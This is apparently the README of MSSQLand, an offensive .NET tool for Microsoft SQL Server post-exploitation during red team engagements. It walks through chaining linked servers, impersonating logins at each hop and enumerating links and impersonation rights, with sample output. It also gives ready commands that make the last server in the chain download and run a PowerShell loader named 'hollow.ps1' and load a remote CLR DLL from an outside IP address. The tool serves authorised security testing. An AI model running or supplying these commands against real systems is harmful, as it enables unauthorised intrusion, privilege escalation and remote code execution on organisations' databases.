MSSQLand is built for interacting with [Microsoft SQL Server](https://en.wikipedia.org/wiki/Microsoft_SQL_Server) database management system (DBMS) during your red team activities. Designed for constrained environments where operations must be executed directly through your beacons, it allows you to pave your way across multiple linked servers and impersonate whoever you can along the way, emerging from the last hop with any desired action.

## üìÉ Documentation

MSSQLand is built using `.NET Framework 4.8`, with assembly execution in mind.

- For a full list of commands, arguments, and actions, check out [COMMANDS.md](./COMMANDS.md).
- For an overview of the project structure, refer to [STRUCTURE.md](./STRUCTURE.md).
- Learn how to add new actions in [DEVELOPERS.md](./DEVELOPERS.md).

## üì∏ Clean Output for Clean Reports

The tool's output, enriched with timestamps and valuable contextual information, is designed to produce visually appealing and professional results, making it ideal for capturing high-quality screenshots for any of your reports (e.g., customer deliverable, internal report, red team assessments).

All output tables are Markdown-friendly and can be copied and pasted directly into your notes without any formatting hassle.

## üëë Show Time

You gain access to a database `SQL01` mapped to the user `dbo`. You need to impersonate `webapp02` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `webapp03` in order to go further and so on and so forth. Let's say you‚Äôve landed an agent inside a `sqlservr.exe` process running under the high-privileged `NT AUTHORITY\SYSTEM`. Lucky you!

After some reconnaissance, you suspect this is a multi-hop linked server chain. Typing out all those **RPC** or **OPENQUERY** calls manually? 

This is what it looks like to verify if you are `sysadmin` in `SQL03` when you have to impersonate `webapp03` on `SQL02` and `webapp04` on `SQL03`:

- [OPENQUERY](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_data_access_enabled`):

```sql
SELECT * FROM OPENQUERY([SQL02], 'EXECUTE AS LOGIN = ''webapp03''; SELECT * FROM OPENQUERY([SQL03], ''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') REVERT;')
```

- [RPC Out](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_rpc_out_enabled`):

```shell
EXEC ('EXECUTE AS LOGIN = ''webapp03''; EXEC (''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') AT [SQL03]; REVERT;') AT [SQL02]
```

No thanks üö´. Let MSSQLand handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:

```shell
.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
```

The output is as follows:
```txt

[+] Connection opened successfully
|-> Server: localhost,1433
|-> Database: master

| Last Modified        | Link  | Product    | Provider | Data Source | Local Login | Remote Login | RPC Out | OPENQUERY | Collation |

```

Now you want to verify who you can impersonate at the end of the chain:
```shell
.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
```
The output shows:

```txt
[>] Trying to connect with TokenCredentials
[+] Connection opened successfully
|-> Server: localhost,1433
|-> Database: master
|-> Server Version: 15.00.2000
|-> Client Workstation ID: WS-445c74

[>] Executing action 'Impersonation' against SQL04
|-> Starting impersonation check for all logins
|-> Checking impersonation permissions individually

| Logins      | Impersonation |
| ----------- | ------------- |
| sa          | No            |
| MarieJo     | Yes           |
| Imane       | Yes           |
| John        | No            |
```

Great! Now you can directly reach out to your loader with:
```shell
.\MSSQLand.exe /h:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:MarieJo /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
```

Or even use Common Language Runtime (CLR) to load remotely a library with:
```txt
/a:clr \"http://172.16.118.218/d/SqlLibrary.dll\"
```

## ü•ö Origin

MSSQLand was born from real-world needs and hard-earned lessons.

Originally, I contributed extensively to [SQLRecon](https://github.com/skahwah/SQLRecon), which provided a solid foundation for MS SQL post-exploitation and reconnaissance. However, during my contributions to SQLRecon, particularly in addressing [chained linked server traversal](https://github.com/skahwah/SQLRecon/issues/16#issuecomment-2048435229) and enhancing user impersonation, I encountered significant roadblocks in how contributions were handled. [My pull request](https://github.com/skahwah/SQLRecon/pull/17), which introduced major improvements in impersonation, chaining, and context management, was ultimately not merged but copy pasted.

Rather than let this work go to waste, I decided to develop MSSQLand, an OOP-driven, modular, and community-friendly alternative. Unlike SQLRecon, which required deep refactoring to make simple modifications, MSSQLand was built with developers in mind. The tool is built with extensibility in mind, allowing integration of new features while maintaining clarity and simplicity. It aims to provide a structured, customizable, and operator-friendly experience for engagements requiring MS SQL exploitation.
